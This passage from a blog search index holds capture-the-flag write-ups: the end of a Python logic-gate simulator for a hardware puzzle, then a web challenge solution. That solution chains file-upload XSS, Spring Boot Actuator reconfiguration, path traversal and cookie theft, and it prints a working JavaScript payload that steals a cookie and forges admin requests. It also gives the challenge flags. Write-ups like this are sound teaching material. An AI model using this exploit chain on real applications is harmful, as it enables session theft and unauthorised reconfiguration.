<span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">        ref = <span class="string">f&#x27;Q<span class="subst">&#123;i&#125;</span>&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> ref <span class="keyword">in</span> components:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">in</span> components[ref][<span class="string">&#x27;pins&#x27;</span>]:</span><br><span class="line">                led_nets.append(components[ref][<span class="string">&#x27;pins&#x27;</span>][<span class="string">&#x27;1&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Simulation function</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">simulate</span>(<span class="params">inputs_bits</span>):</span><br><span class="line">        vals = &#123;<span class="string">f&#x27;/IN<span class="subst">&#123;i&#125;</span>&#x27;</span>: inputs_bits[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>)&#125;</span><br><span class="line">        vals[<span class="string">&#x27;GND&#x27;</span>] = <span class="literal">False</span></span><br><span class="line">        vals[<span class="string">&#x27;+5V&#x27;</span>] = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        memo = &#123;&#125;</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">get_val</span>(<span class="params">net</span>):</span><br><span class="line">            <span class="keyword">if</span> net <span class="keyword">in</span> vals: <span class="keyword">return</span> vals[net]</span><br><span class="line">            <span class="keyword">if</span> net <span class="keyword">in</span> memo: <span class="keyword">return</span> memo[net]</span><br><span class="line">            <span class="keyword">if</span> net <span class="keyword">not</span> <span class="keyword">in</span> net_logic: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">            op, ins = net_logic[net]</span><br><span class="line">            in_vals = [get_val(i) <span class="keyword">for</span> i <span class="keyword">in</span> ins]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> op == <span class="string">&#x27;00&#x27;</span>: <span class="keyword">return</span> <span class="keyword">not</span> (in_vals[<span class="number">0</span>] <span class="keyword">and</span> in_vals[<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&#x27;02&#x27;</span>: <span class="keyword">return</span> <span class="keyword">not</span> (in_vals[<span class="number">0</span>] <span class="keyword">or</span> in_vals[<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&#x27;04&#x27;</span>: <span class="keyword">return</span> <span class="keyword">not</span> in_vals[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&#x27;08&#x27;</span>: <span class="keyword">return</span> in_vals[<span class="number">0</span>] <span class="keyword">and</span> in_vals[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&#x27;20&#x27;</span>: <span class="keyword">return</span> <span class="keyword">not</span> <span class="built_in">all</span>(in_vals)</span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&#x27;21&#x27;</span>: <span class="keyword">return</span> <span class="built_in">all</span>(in_vals)</span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&#x27;27&#x27;</span>: <span class="keyword">return</span> <span class="keyword">not</span> <span class="built_in">any</span>(in_vals)</span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&#x27;32&#x27;</span>: <span class="keyword">return</span> <span class="built_in">any</span>(in_vals)</span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&#x27;86&#x27;</span>: <span class="keyword">return</span> in_vals[<span class="number">0</span>] ^ in_vals[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">else</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">            memo[net] = res</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [get_val(ln) <span class="keyword">for</span> ln <span class="keyword">in</span> led_nets]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Brute force 7-bit ASCII</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">19</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;LED <span class="subst">&#123;i+<span class="number">1</span>&#125;</span>: &quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> code <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">            bits = [(code &gt;&gt; j) &amp; <span class="number">1</span> == <span class="number">1</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>)]</span><br><span class="line">            outputs = simulate(bits)</span><br><span class="line">            <span class="keyword">if</span> outputs[i]:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;&#x27;<span class="subst">&#123;<span class="built_in">chr</span>(code)&#125;</span>&#x27; (0x<span class="subst">&#123;code:02x&#125;</span>)&quot;</span>, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">get_logic()</span><br></pre></td></tr></table></figure>
+<h3 id="flag">Flag</h3>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">UMASS{In_Th3_G4t3s}</span></span>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>UMass CTF 2026 - The Block City Times</title>
+    <url>/wp/umass2026/umassctf2026-the-block-city-times/</url>
+    <content><![CDATA[<blockquote>
+<p>The Block City Times is here to inform you!</p>
+</blockquote>
+<h3 id="initial-analysis">Initial Analysis</h3>
+<p>“The Block City Times” is a complex web application built with Spring
+Boot, involving multiple internal services (<code>editorial</code>,
+<code>report-runner</code>) and a Puppeteer-based bot. The challenge
+requires chaining several vulnerabilities to leak a sensitive
+<code>FLAG</code> cookie from an internal diagnostic service.</p>
+<h3 id="solution">Solution</h3>
+<p>The attack follows a multi-stage exploit chain:</p>
+<ol type="1">
+<li><p><strong>Arbitrary File Upload &amp; XSS</strong>: The
+<code>/submit</code> endpoint allows uploading “story” files. Although
+it checks the <code>Content-Type</code>, this is easily bypassed. Files
+are saved with their original extension and served via
+<code>/files/&#123;filename&#125;</code>. By uploading an <code>.html</code> file
+with <code>Content-Type: text/plain</code>, we can achieve stored
+XSS.</p></li>
+<li><p><strong>Administrative Bot Triggering</strong>: The
+<code>editorial</code> service automatically reviews every submission by
+visiting the uploaded file as an administrator. This allows our XSS
+payload to execute with administrative privileges.</p></li>
+<li><p><strong>Actuator Abuse</strong>: The application exposes Spring
+Boot Actuator endpoints. Via XSS, the <code>editorial</code> bot can be
+forced to modify application properties at runtime:</p>
+<ul>
+<li>Disable production enforcement: <code>POST /actuator/env</code> with
+<code>app.enforce-production=false</code>.</li>
+<li>Switch to dev mode: <code>POST /admin/switch?config=dev</code>.</li>
+</ul></li>
+<li><p><strong>SSRF &amp; Cookie Leakage</strong>: The
+<code>report-runner</code> service logs in as an admin, sets a
+<code>FLAG</code> cookie, and visits a user-specified API endpoint.
+While it checks if the endpoint starts with <code>/api/</code>, this can
+be bypassed with path traversal (e.g.,
+<code>/api/../files/exploit.html</code>).</p></li>
+</ol>
+<h4 id="exploit-payload-exploit.html">Exploit Payload
+(<code>exploit.html</code>)</h4>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  (<span class="title function_">async</span> () =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> <span class="title function_">sleep</span> = (<span class="params">ms</span>) =&gt; <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">r</span>) =&gt;</span> <span class="built_in">setTimeout</span>(r, ms));</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> filename = location.<span class="property">pathname</span>.<span class="title function_">split</span>(<span class="string">&quot;/&quot;</span>).<span class="title function_">pop</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// STAGE 2: If visited by report-runner, leak the flag to article tags</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">includes</span>(<span class="string">&quot;FLAG=&quot;</span>)) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&quot;/api/tags/article/1&quot;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">method</span>: <span class="string">&quot;PUT&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">headers</span>: &#123; <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span> &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>([<span class="variable language_">document</span>.<span class="property">cookie</span>]),</span></span><br><span class="line"><span class="language-javascript">      &#125;);</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// STAGE 1: If visited by editorial bot, reconfigure the app and trigger report</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&quot;/actuator/env&quot;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">headers</span>: &#123; <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span> &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">name</span>: <span class="string">&quot;app.enforce-production&quot;</span>, <span class="attr">value</span>: <span class="string">&quot;false&quot;</span> &#125;),</span></span><br><span class="line"><span class="language-javascript">      &#125;);</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&quot;/actuator/env&quot;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">headers</span>: &#123; <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span> &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">name</span>: <span class="string">&quot;app.active-config&quot;</span>, <span class="attr">value</span>: <span class="string">&quot;dev&quot;</span> &#125;),</span></span><br><span class="line"><span class="language-javascript">      &#125;);</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&quot;/actuator/refresh&quot;</span>, &#123; <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span> &#125;);</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">2000</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> adminPage = <span class="title function_">await</span> (<span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&quot;/admin&quot;</span>)).<span class="title function_">text</span>();</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> csrfToken = adminPage.<span class="title function_">match</span>(<span class="regexp">/name=&quot;_csrf&quot; value=&quot;([^&quot;]+)&quot;/</span>)[<span class="number">1</span>];</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> params = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>();</span></span><br><span class="line"><span class="language-javascript">      params.<span class="title function_">append</span>(<span class="string">&quot;_csrf&quot;</span>, csrfToken);</span></span><br><span class="line"><span class="language-javascript">      params.<span class="title function_">append</span>(<span class="string">&quot;endpoint&quot;</span>, <span class="string">&quot;/api/../files/&quot;</span> + filename);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&quot;/admin/report&quot;</span>, &#123; <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>, <span class="attr">body</span>: params &#125;);</span></span><br><span class="line"><span class="language-javascript">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>After uploading the exploit (bypassing the extension check by
+modifying the filename to <code>.html</code> in the multipart request),
+the <code>editorial</code> bot triggers the reconfiguration and the
+<code>report-runner</code>. The flag is then leaked to the tags of
+Article 1.</p>
+<h3 id="flag">Flag</h3>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">UMASS{A_mAn_h3s_f@l13N_1N_tH3_r1v3r}</span></span>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>web</tag>
+      </tags>
+  </entry>
 </search>
